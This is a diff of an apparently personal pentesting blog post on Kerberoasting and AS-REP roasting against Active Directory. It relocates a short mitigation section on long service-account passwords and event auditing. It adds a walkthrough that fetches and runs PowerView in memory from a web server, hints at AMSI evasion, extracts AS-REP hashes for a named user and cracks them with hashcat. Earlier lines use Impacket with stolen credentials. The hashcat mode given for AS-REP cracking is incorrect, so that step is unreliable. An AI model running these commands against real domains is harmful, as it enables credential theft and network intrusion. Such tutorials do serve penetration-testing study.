@@ -102,16 +102,6 @@ Of course this is as simple cracking attack as it's just against a simple wordli
 
 
 
-**Mitigation / Defending**
-
-The most effective technique of defending against this is of course to make sure Service Accounts have extremely long passwords, 32 of extremely high complexity.
-
-In terms of detecting Kerberoast it can be quite tricky as it's normal activity for TGS to be requested however you can enable `Audit Kerberos Service Ticket Operations` under Account Logon to log TGS ticket requests.
-
-However as this is normal operation you will get ALOT ALOT of `Event 4769` & `Event 4770` alerts
-
-
-
 ## [](#header-5)Rubeus
 
 
@@ -218,7 +208,13 @@ Invoke-Kerberoast -OutputFormat hashcat | % { $_.Hash } | Out-File -Encoding ASC
 
 
 
+**Mitigation / Defending** **against Kerberoast**
 
+The most effective technique of defending against this is of course to make sure Service Accounts have extremely long passwords, 32 of extremely high complexity.
+
+In terms of detecting Kerberoast it can be quite tricky as it's normal activity for TGS to be requested however you can enable `Audit Kerberos Service Ticket Operations` under Account Logon to log TGS ticket requests.
+
+However as this is normal operation you will get ALOT ALOT of `Event 4769` & `Event 4770` alerts
 
 ## [](#header-3)From Linux
 
@@ -239,16 +235,108 @@ If you haven't heard of Impacket by now it's a collection of python scripts for 
 Armed with `GetUserSPNs.py` and a already pwned `Domain Users` credentials we can simply run the below
 
 ```python
-m0chan@kali:/scripts/ > python GetUserSPNs.py m0chanAD/pwneduser:pwnedcreds -outputfile hashes.kerberoast
+m0chan@kali:/scripts/> python GetUserSPNs.py m0chanAD/pwneduser:pwnedcreds -outputfile hashes.kerberoast
 ```
 
 
 
-This outputed file can now be sent to Hashcat to crack, there are alternative means to cracking on Linux but in all my time Hacking I have never once had a good time trying to crack on Linux. I find Hashcat on a Windows machine with NVIDIA cards is the best route (personally).
+This outputted file can now be sent to Hashcat to crack, there are alternative means to cracking on Linux but in all my time Hacking I have never once had a good time trying to crack on Linux. I find Hashcat on a Windows machine with NVIDIA cards is the best route (personally).
 
 
 
 ## [](#header-2)AS-REP Roasting
 
 
+
+`AS-REP` roasting is an attack that is often-overlooked in my opinion it is not extremely common as you have to explicitly set `Accounts Does not Require Pre-Authentication` aka `DONT_REQ_PREAUTH`
+
+`Pre-Authentication` is the first step in Kerberos Authentication and it's main role is to try prevent against brute-force password guessing attacks. 
+
+Typcially during Pre-Auth a user will enter his creds which will be used to encrypt a time stamp and the DC will decrypt it to validate that the correct creds were used. If the DC verifies okay it will issue a `TGT` however if `Pre-Authentication` is disabled it would allow an attacker to request a ticket for any user and the `DC	`would simply return a `TGT` which will be encrypted similar to the `Kerberoast` attack which can be cracked offline. 
+
+`AS-REP` is cool as you don't even have to do it from a **Domain-Joined Machine** or `Domain-User` you just have to have access to request to the `KDC` however being on a **Domain-Joined Machine** or having Domain Creds will make the enumeration process way easier as you can simply use LDAP Filter or PowerView to find targets. 
+
+Such as 
+
+```powershell
+Get-ADUser -Filter 'useraccountcontrol -band 4194304' -Properties useraccountcontrol | Format-Table name
+```
+
+
+
+
+
+## [](#header-3)From Windows
+
+
+
+Just like Kerberoasting AS-REP Roasting can be done from both Windows & Linux but we will cover Windows first as it's much more convenient. We are attacking windows after all!  
+
+
+
+## [](#header-5)Powerview
+
+
+
+ **Enumeration**
+
+First let's import `PowerView.ps1` into Memory with 
+
+```powershell
+IEX (New-Object Net.WebClient).DownloadString('http://werbserver:80/PowerView.ps1')
+```
+
+
+
+As said above under `Kerberoasting` `AMSI` will probably flag this on `WIN10 1803` but I will leave evasion upto yourselves.
+
+Now with PowerView in memory on a **Domain-Joined Machine** we can simply run
+
+```powershell
+Get-DomainUser -PreauthNotRequired -Properties distinguishedname -Verbose
+```
+
+You can also do the below
+
+```powershell
+Get-DomainUser victimuser | Convert-FromUACValue
+```
+
+
+
+**Exploit**
+
+Armed with our target user with `DONT_REQ_PREAUTH` set we can now request the relevant ticket to crack offline. Sadly `PowerView.ps1` does not have a ASREP Roasting Function included however the author `harmj0y` or `PowerView` created a fantastic module to do this with
+
+*https://github.com/HarmJ0y/ASREPRoast*
+
+
+
+Simply Import the Module with 
+
+```powershell
+Import-Module .\ASREPRoast.ps1
+```
+
+
+
+And now we can simply run
+
+```powershell
+Get-ASRepHash -Domain rastalabs.local -UserName ngodfrey
+```
+
+
+
+This will return a Hash which you can crack with Hashcat with the below Syntax
+
+```powershell
+hashcat64.exe -a 0 -m 7500 asrep.hash /wordlists/rockyou.txt
+```
+
+
+
+*PS: You will have to install the latest version of Hashcat to get the support for AS-REP Cracking* 
+
+*John also support AS-REP Cracking but I have never tried it*
 
